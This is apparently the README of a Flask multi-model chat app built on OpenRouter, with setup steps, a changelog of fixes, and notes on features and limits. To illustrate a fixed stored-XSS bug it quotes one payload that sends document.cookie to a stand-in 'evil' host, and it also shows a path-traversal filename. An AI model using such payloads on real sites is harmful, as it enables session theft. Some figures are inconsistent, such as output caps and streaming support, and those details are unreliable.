# One AI

A Flask chat app that queries three "expert" personas on OpenRouter in parallel,
then has an aggregator model reconcile them into a single answer.

---

## Setup

**New to this? Open `START-HERE.md` instead** — it walks through installing
Python and running the setup script, with no command line knowledge assumed.

The manual route, if you prefer it:

```bash
python -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt

cp .env.example .env               # then edit .env and add your key
python -c "import secrets; print(secrets.token_hex(32))"   # paste as SECRET_KEY

python app.py
```

Open http://127.0.0.1:5000.

Verify it's alive: `curl http://127.0.0.1:5000/healthz`

### Tests

Tests ignore your `.env` (`ONEAI_SKIP_DOTENV`) so your own settings cannot
change what they exercise.

```bash
python -m tests.test_smoke         # 34 backend checks
python -m tests.test_attachments   # 54 upload / extraction / vision checks
python -m tests.test_editing       # 38 edit / regenerate / export checks
npm install jsdom
node tests/dom_test.js             # 57 frontend checks
```

None of these need a real API key — the model layer is stubbed.

---

## Deploying to PythonAnywhere

**The free tier cannot reach OpenRouter.** Free accounts route all outbound
traffic through a proxy that only permits allowlisted domains; you'll get
`ProxyError: Tunnel connection failed: 403 Forbidden`. Two options:

1. Upgrade to any paid plan — paid accounts have unrestricted outbound access.
2. Ask PythonAnywhere support to allowlist `openrouter.ai`. They generally
   accept public, documented APIs, but this is at their discretion and not
   instant.

Once that's sorted:

1. Upload the project to `/home/YOURUSER/one-ai/`.
2. **Web** tab → *Add a new web app* → *Manual configuration* → Python 3.10+.
3. Set **Source code** and **Working directory** to `/home/YOURUSER/one-ai`.
4. Edit the WSGI configuration file, delete everything, and put in:

   ```python
   import sys
   sys.path.insert(0, '/home/YOURUSER/one-ai')
   from wsgi import application
   ```

5. Create `.env` with `DB_PATH=/home/YOURUSER/one-ai/database.db`.
   The absolute path matters — the WSGI worker's working directory is not your
   project folder, so a relative path silently creates a second, empty database.
6. In a Bash console: `pip install --user -r requirements.txt`
7. Reload the web app.

**Free-tier threading:** the expert panel runs three concurrent requests. If you
hit worker limits, set `PANEL_MODELS` to a single model, or reduce the panel by
editing `PERSONAS` in `llm.py`.

### Any other host (gunicorn)

```bash
gunicorn --workers 2 --threads 4 --timeout 180 wsgi:application
```

The long timeout is deliberate: the panel plus the aggregator is four sequential
model round-trips, so a request can legitimately take 60–90 seconds.

---

## Configuration

All settings live in `.env`, read by `config.py`. See `.env.example`.

The model IDs matter. OpenRouter's free roster rotates without notice — models
get pulled or repriced, and a hardcoded ID that worked last month returns a 404
today. `PANEL_MODELS`, `AGGREGATOR_MODEL`, and `FALLBACK_MODELS` are all
env-driven, and the client walks the fallback list until something answers.
Check https://openrouter.ai/models?q=:free when calls start failing.

Free models are rate limited (roughly 20 requests/minute, with a daily cap that
depends on your account). One chat message costs **four** requests, so you'll
hit limits about four times faster than you'd expect.

---

## What was wrong, and what changed

### Crashes (your reported errors)

| Problem | Fix |
|---|---|
| `undefined name 'sqllite3'` | Typo; the module is `sqlite3`. |
| `undefined name 'sqlite3'` | `import sqlite3` was missing entirely. |
| `undefined name 'os'` | `import os` was missing; every `os.getenv` call would have raised. |

Those three were fatal on the first request. Below are the ones that would have
bitten you afterwards.

### Data integrity

- **Chat deletion could orphan messages.** `delete_chat` ran two statements
  without a transaction. Now a real foreign key with `ON DELETE CASCADE`, and
  the delete happens in one transaction.
- **Connections leaked on error.** Every route did `connect()` → work →
  `close()` with no `try/finally`. Any exception mid-route leaked the handle and
  left the database locked. Now a context manager that commits, rolls back, and
  always closes.
- **Concurrency.** SQLite connections aren't thread-safe and Flask serves on
  multiple threads. Now one connection per request, plus WAL mode so a reader
  is never blocked by the writer.
- **Search matched everything on a `%`.** User input went straight into a
  `LIKE` pattern, so typing `%` returned every chat. Wildcards are now escaped.
- **No indexes.** Added on `messages(chat_id, id)` and `chats(updated_at)`.
- **Migration.** Your existing `database.db` is upgraded in place — new columns
  added, and the old `'User'` / `'One AI'` role values normalised to
  `'user'` / `'assistant'`. Nothing is lost.

### Correctness

- **The assistant had no memory.** Each `/chat` call sent only the current
  prompt, so within a single conversation it couldn't refer to anything said
  earlier. It now replays the last `HISTORY_TURNS` messages.
- **Errors were saved as answers.** On failure the old code set
  `ans = "...Error: {e}"` and then wrote that string into `messages` as an
  assistant reply — permanently poisoning the chat history and the context sent
  to the model. Failures now return HTTP 503 and persist nothing.
- **`prompt[:25]` crashed on a missing message.** A request without `message`
  raised `TypeError` on `None`. All inputs are now validated with clear 400s.
- **`chat_id` type confusion.** `"temp"` is a string, but the code compared
  `chat_id != "temp"` and then used the value as an integer elsewhere. Parsing
  is now centralised in `parse_chat_id`.
- **No timeout on the aggregator call.** Panel calls had `timeout=10`; the final
  synthesis call had none and could hang a worker indefinitely.
- **A single dead model killed the whole response.** Now each node falls through
  a configurable fallback list, and if the entire panel is down the app answers
  directly and flags the response as `degraded` rather than failing.
- **All three "experts" were the same model.** They all called
  `openrouter/free`, which is an auto-router — three round-trips to arrive at
  roughly one model's opinion, three times over. `PANEL_MODELS` now distributes
  nodes across distinct models, which is what makes the ensemble worth its
  latency. Point it at three different model IDs for the real benefit.

### Security

- **Stored XSS in the frontend.** `box.innerHTML += ...${val}...` injected
  message text as live HTML. A message containing
  `<img src=x onerror="fetch('//evil/'+document.cookie)">` executed on render —
  and, because messages are stored, re-executed every time that chat was
  reopened. All user text now goes through `textContent`; model markdown is
  rendered then sanitised with DOMPurify.
- **`debug=True`.** The Werkzeug debugger exposes an interactive Python console
  to anyone who triggers an error. Now off unless `FLASK_DEBUG=true`.
- **`CORS(app)` allowed every origin.** Any website could call your API using
  your credits. CORS is off by default; set `CORS_ORIGINS` only if you need it.
- **Exceptions leaked to the client.** `str(e)` was returned in the response
  body, which can include upstream URLs and key fragments. Errors are now
  logged server-side and generic to the client.
- **No request size limit.** Capped at 1 MB, with a separate 12,000-character
  prompt limit.
- **Secrets in git.** Added `.gitignore` covering `.env` and `*.db`.

### Regenerate corrupted saved history

`regenerate` re-POSTed to `/api/chat`, which appends a new user *and* assistant
message every time. The UI swapped the answer in place, so it looked correct
while the stored transcript quietly accumulated a duplicate exchange per click
-- and those duplicates were then replayed to the model as context on later
turns.

There are now dedicated `POST /api/chats/<id>/regenerate` and
`POST /api/chats/<id>/edit` endpoints that truncate from the target message and
write one replacement. Both generate the new answer **before** truncating, so a
model failure returns 503 and leaves your history exactly as it was rather than
deleting messages and then failing.

### Frontend

- Switched to `/api/*` routes with proper verbs (`PATCH`, `DELETE`); the old
  URLs still work so nothing breaks mid-migration.
- Every `fetch` was unguarded — a failed request threw, leaving the spinner
  running forever with no message. All calls now go through one handler with
  inline errors and a Retry button.
- Double-submit was possible; the send button is now disabled while in flight.
- Search fired a database query on every keystroke; now debounced to 250 ms.
- The magnetic-hover effect ran `querySelectorAll` plus `getBoundingClientRect`
  on every element on every mousemove — layout thrash on a hot path. Now one
  cached list updated by a `MutationObserver`, applied inside the animation
  frame.
- Decorative effects are skipped entirely on touch devices and when
  `prefers-reduced-motion` is set.
- `newChat()` assigned `box` without `let`, creating an implicit global.
- The file picker only showed an alert. Text and code files are now actually
  read and attached to the prompt; binary types say so plainly instead of
  pretending to work.
- Input is now a textarea: Enter sends, Shift+Enter adds a newline.
- Added mobile breakpoints, focus-visible outlines, and `aria-label`s on
  icon-only buttons.

---

## Project layout

```
one-ai/
├── app.py              routes, validation, error handling
├── models.py           live model catalog + capability discovery
├── attachments.py      upload validation and text extraction
├── config.py           env config with startup validation
├── db.py               SQLite access, schema, migration
├── llm.py              panel orchestration, fallbacks, timeouts
├── wsgi.py             gunicorn / PythonAnywhere entry point
├── setup.bat / setup.sh    one-click install
├── run.bat / run.sh        start the app
├── START-HERE.md           quickstart for a fresh machine
├── tools/
│   ├── make_env.py     creates .env with a generated SECRET_KEY
│   └── doctor.py       diagnoses a broken install
├── templates/
│   └── index.html      UI (your design, rewritten JS)
├── static/             put logo.png here
├── tests/
│   ├── test_smoke.py        34 backend checks
│   ├── test_attachments.py  54 upload/vision checks
│   ├── test_editing.py      38 edit/regenerate/export checks
│   └── dom_test.js          57 frontend checks
├── requirements.txt
├── .env.example
└── .gitignore
```

---

## Attachments

Click the **+** button, drag files anywhere onto the window, or paste a
screenshot straight into the composer. Up to 5 files per message.

| Type | What happens |
|---|---|
| PNG, JPG, WEBP, GIF, BMP | EXIF-rotated, downscaled to 1536px, re-encoded as JPEG, sent to a vision model |
| PDF | Text extracted server-side with `pypdf`, page by page |
| DOCX | Paragraphs and table rows extracted with `python-docx` |
| TXT, MD, CSV, JSON, YAML, and ~35 code extensions | Decoded and inlined into the prompt |

Extraction runs on the server, not in the browser — the browser cannot read PDF
or DOCX, and a client-supplied file type can't be trusted anyway. Files upload
as soon as you pick them, so by the time you hit send the text is already
extracted and the message only carries an id.

**Images route to different models.** A text-only model given an image silently
drops it and answers confidently about nothing, which is worse than an error.
When a message contains an image the app switches to vision-capable models and
raises a clear error if none are available.

**Scanned PDFs won't work.** If a PDF has no text layer, you get a message
saying so rather than an empty answer. Export the page as an image and attach
that instead — the vision model can read it.

Executables (`.exe`, `.dll`, `.jar`, and similar) are refused. Filenames are
stripped to their base name, so `../../etc/passwd.txt` becomes `passwd.txt`.

Attachments are stored in the database, not on disk, so deleting a chat removes
them via cascade and a redeploy doesn't orphan files. Uploads never attached to
a message are purged after 24 hours, on startup.

## Modes

The mode switcher sits under the composer. It is remembered between sessions.

| Mode | Requests | Output cap | Use for |
|---|---|---|---|
| **Panel** | 4 | 4,096 | Open questions, comparisons, explanations |
| **Direct** | 1 | 4,096 | Everything you want answered quickly |
| **Code** | 1 | 32,000 | Writing, reviewing, and debugging code |

**Use Code mode for code.** The panel is the wrong tool for it. Ensembling helps
when errors are uncorrelated and answers are fuzzy; code is verifiable and
brittle. Three weak models produce three different designs, and a fourth weak
model that never runs any of them splices them together. One coding-tuned model
beats a committee of weak ones.

The arithmetic matters too. Free OpenRouter models allow roughly 20 requests per
minute and a couple of hundred a day. Panel mode spends **four requests per
message**; code mode spends one. Same budget, four times the work, and without
the extra minute of latency.

**Output ceiling.** The old 2,048-token cap was about 150 lines — long answers
were cut off mid-function with no indication. Code mode allows 32,000, and if a
response still hits the ceiling the app asks the model to continue from where it
stopped and stitches the parts together. If it is still incomplete after
`MAX_CONTINUATIONS`, the consensus strip says `OUTPUT LIMIT REACHED` rather than
quietly handing you half a file.

**Streaming** (`STREAMING=true`) applies to Direct and Code only — the panel has
nothing to stream, since no useful text exists until the aggregator runs. Text
is appended as plain text while streaming and re-rendered as markdown at the
end, so a half-written code fence never flashes as broken HTML. Leave streaming
off on PythonAnywhere: it buffers responses, so the whole answer would arrive in
one lump at the end, slower than not streaming at all.

### Code blocks

Each block shows its language and, when the model puts a path in a leading
comment (`# db.py`, `// src/app.js`), lifts that filename into the header. Copy
and download buttons are both there; download names the file from the detected
path, or falls back to the right extension for the language.

## Free only, enforced

This app will not call a paid model. `FREE_ONLY=true` is not a preference the
code politely honours — every model ID is checked against live catalog pricing
immediately before the request is sent, and a paid one raises rather than
dialling out. A typo, a stale copy-paste, or a model that silently moves from
free to paid all get blocked instead of billed.

When the catalog is unreachable the guard falls back to OpenRouter's `:free`
naming convention and treats any unsuffixed ID as paid. Conservative by design:
the failure mode is "refused to answer", never "spent your money".

`GET /api/models` shows exactly what each mode would use, in order, with a free
flag on every entry. Check it first when a mode starts failing.

### Best free models, August 2026

Ranked by OpenRouter's own Programming category:

| Model | Programming rank | Context | Notes |
|---|---|---|---|
| `cohere/north-mini-code:free` | #18 | 256K | 64K output, Apache 2.0. Default first pick. |
| `nvidia/nemotron-3.5-lightning:free` | #22 | 1M | Fast, high throughput |
| `nvidia/nemotron-3-super-120b-a12b:free` | #28 | 1M | Strong on SWE-Bench Verified |
| `poolside/laguna-xs-2.1:free` | #33 | 256K | See the warning below |
| `google/gemma-4-26b-a4b-it:free` | — | 256K | Vision: images and video |

**One thing to know before using Poolside models.** Their free tier states that
your inputs and outputs may be used to train their models. When the input is
your source code, that is a real cost, just not a monetary one. They still work
and are still selectable, but they are ordered last, and `TRAINS_ON_FREE` in
`.env` controls that. Cohere and NVIDIA carry no such notice.

**IDs go stale fast.** `qwen/qwen3-coder:free` and `gemma-4-31b-it:free` were
both in this project's defaults a week ago and are already gone from the free
roster. That is why discovery exists — pinned IDs are a starting point, not a
dependency. If a mode starts failing, clear `CODE_MODELS` and let the app pick.

### The request budget

The counter next to the mode switch is not decoration. OpenRouter's free tier
allows roughly 20 requests a minute and a limited number per day, and **panel
mode spends four requests per message**. That is the difference between about
50 messages a day and about 200.

If you code with this, use Code mode. Same daily allowance, four times the work,
and no minute-long wait. A 429 now returns a clear message telling you to switch
modes rather than a generic failure.

## How this compares

| | One AI | Kimi K2.7 Code | Claude |
|---|---|---|---|
| Model | free tier, rotating | 1T MoE, 256K context | Opus / Sonnet |
| Max output | 16,000 (code mode) | ~65,000 | tens of thousands |
| Reads your repo | no | Kimi Code CLI | Claude Code |
| Runs commands | no | yes | yes |
| Cost | free | ~$0.95/$4.00 per M tokens | subscription or API |

The honest gap is not the interface any more — it is tool use. One AI cannot
read your project, run your tests, or apply a patch; you paste code in and copy
code out. That is the real difference between this and Kimi Code CLI or Claude
Code, and it is not something a better model fixes.

On model quality, the gap is smaller than it looks. `north-mini-code` is a
genuine agentic coding model with a 256K context and 64K output, and for
single-file work — write this function, explain this error, review this module —
it holds up. Where free models fall behind is long multi-step work across many
files, which is exactly the work that needs the tool access this app does not
have. The two limits meet in the same place, so paying for a frontier model here
would buy less than it seems.

## Design

**Graphite and brass.** Cool graphite surfaces with one warm brass accent, used
only for things that are live or actionable: the send button, the active chat,
focus rings, and the consensus strip. Nothing is coloured for decoration.

**Two typefaces, one rule.** IBM Plex Sans for prose, IBM Plex Mono for every
piece of instrumentation — timestamps, node counts, date groups, code, table
headers, the version tag. If it is a measurement, it is monospaced. If it is
language, it is not.

**The consensus strip** is the one element carrying the product's identity.
While an answer generates it is the progress readout; when the answer lands it
stays put as the receipt: `3 OF 3 NODES · RECONCILED / 47s`, or
`2 OF 3 NODES · RECONCILED / 31s / PARTIAL PANEL` when a node dropped out. It is
the same component in two states, and the data behind it is stored with the
message, so it is still there when you reopen the chat weeks later.

That honesty matters more than it sounds: the app really does answer from a
degraded panel sometimes, and previously that fact vanished into a toast you
would miss. Now it is attached to the answer permanently.

### What was removed

The old interface had a sparkle trail following the cursor, buttons that pulled
toward the pointer, a title that animated every 60 seconds, emoji standing in
for icons, and a blue-to-purple gradient. All of it is gone. None of it helped
anyone answer a question, the pointer effects ran `getBoundingClientRect` over
every button on every mouse move, and emoji render differently on every OS.

Icons are now inline SVG rather than an icon font: one fewer network request,
and no flash of raw ligature text (`add`, `dock_to_right`) if the font is slow.
For the same reason, if `marked` or `DOMPurify` fail to load, answers fall back
to readable plain text instead of throwing and leaving a blank screen.

Code blocks stay dark in both themes. The syntax theme colours tokens for a dark
surface, and re-theming every token per mode is more fragile than keeping one
surface for code.

## Using it

| Shortcut | Does |
|---|---|
| `Enter` | Send |
| `Shift + Enter` | New line |
| `Ctrl/Cmd + K` | Focus search |
| `Ctrl/Cmd + B` | Toggle sidebar |
| `Ctrl/Cmd + J` | Toggle light/dark |
| `Ctrl/Cmd + Shift + O` | New chat |
| `/` | Focus the composer |
| `Esc` | Cancel edit, close dialogs, **stop generating** |
| `?` | Shortcut list |

**Stop button.** A message is four sequential model calls, so 60-90 seconds is
normal. The stop button aborts the request; the composer is refilled with what
you typed so nothing is lost.

**Progress display.** Because there is no streaming, the waiting state shows a
live elapsed-seconds counter and steps through labelled stages. The counter is
real; the node pips are a paced estimate, since without streaming the server
gives no per-node signal. It exists so a 90-second wait doesn't read as a hang.

**Edit and resend.** Editing one of your messages rewrites it and drops
everything after it, so the conversation branches from the edit rather than
growing a contradictory second copy.

**Export.** The download button saves the open chat as Markdown.

**Theme.** Light and dark, defaulting to your OS preference, remembered in
localStorage.

## Model discovery

Model IDs are no longer hardcoded. OpenRouter's free roster is reshuffled
weekly — the free Llama tier, including `llama-3.3-70b`, was delisted in mid-2026,
so any pinned ID eventually 404s.

At startup the app fetches `https://openrouter.ai/api/v1/models`, filters for
zero-priced entries, and sorts by context length. `VISION_MODELS` is populated
the same way, filtered on image input support. The catalog is cached for 6 hours;
if the fetch fails, the app backs off for 5 minutes and uses whatever is in
`.env`, so it still starts on a restricted network.

Anything you set in `.env` is tried first — discovery only extends the list.

## Known limitations

- **No auth.** `yourusername.pythonanywhere.com` is a public URL and a guessable
  one. "Only I have the link" is not access control -- anyone who tries the
  address can read every chat and spend your OpenRouter credits. Not urgent
  while you're testing, but worth adding before you leave it running.
- **No streaming.** You still wait for the full round trip; the progress display
  makes the wait legible but doesn't shorten it. Server-sent events would fix
  the perceived latency, but PythonAnywhere buffers responses, so it would work
  locally and break on deploy.
- **No rate limiting.** Add `flask-limiter` if it's ever public.
- **SQLite** is fine for personal use. It won't hold up under real concurrency.
- **Dependencies are pinned deliberately.** `openai` must be 1.55.3 or newer:
  earlier versions pass a `proxies` argument that httpx removed in 0.28, so a
  fresh install resolves an incompatible pair and the client fails to construct.
  If you loosen `requirements.txt`, verify on a clean virtualenv.
- **Scanned PDFs and audio/video are not supported.** No OCR; attach a scan as
  an image instead.
- **Attachments are stored as base64 in SQLite.** Fine at this scale, but a few
  hundred images will make the database file large. Move to object storage if
  it grows.
